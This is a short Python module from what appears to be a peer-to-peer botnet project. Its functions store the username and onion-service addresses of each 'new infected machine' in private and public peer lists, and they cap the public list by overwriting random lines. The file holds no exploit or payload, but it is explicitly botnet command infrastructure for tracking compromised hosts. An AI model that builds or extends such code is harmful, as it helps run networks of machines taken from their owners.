"""Interesting functions for a botnet"""

import random

from botnet_p2p import (
    PUBLIC_PEER_LIST,
    MAX_PUBLIC_PEER_LIST_LENGTH,
    PRIVATE_PEER_LIST,
    logger,
)

# ----------------- PUBLIC METHODS -----------------


def add_new_infected_machine(msg_data: str):
    """ Store onion services from new infected machine
        in some files.

        Args:
            msg_data: The username of the first created user in the infected machine,
                      and the onion services created
    """
    __append_to_file(PRIVATE_PEER_LIST, msg_data)

    if not __public_peer_list_reached_maximum_length():
        __append_to_file(PUBLIC_PEER_LIST, msg_data)
    else:
        __overwrite_random_line_in_file(PUBLIC_PEER_LIST, msg_data)


# ----------------- PRIVATE METHODS -----------------


def __public_peer_list_reached_maximum_length() -> bool:
    try:
        logger.debug(PUBLIC_PEER_LIST)
        with open(PUBLIC_PEER_LIST, "r") as peer_list:
            num_lines = sum(1 for line in peer_list)
    except FileNotFoundError:
        num_lines = 0

    return num_lines == MAX_PUBLIC_PEER_LIST_LENGTH


def __append_to_file(file_: str, data: str):
    with open(file_, "a") as f:
        f.write(data + "\n")


def __overwrite_random_line_in_file(file_: str, data: str):
    """ Overwrite a random line of the file

        Args:
            file_: File in which we will overwrite a line
            data: Text to write in the file
    """
    line_to_overwrite = random.randint(0, MAX_PUBLIC_PEER_LIST_LENGTH - 1)
    with open(file_, "r") as public_peer_list:
        lines = public_peer_list.readlines()
        lines[line_to_overwrite] = data + "\n"

    with open(file_, "w") as public_peer_list:
        public_peer_list.write("".join(lines))
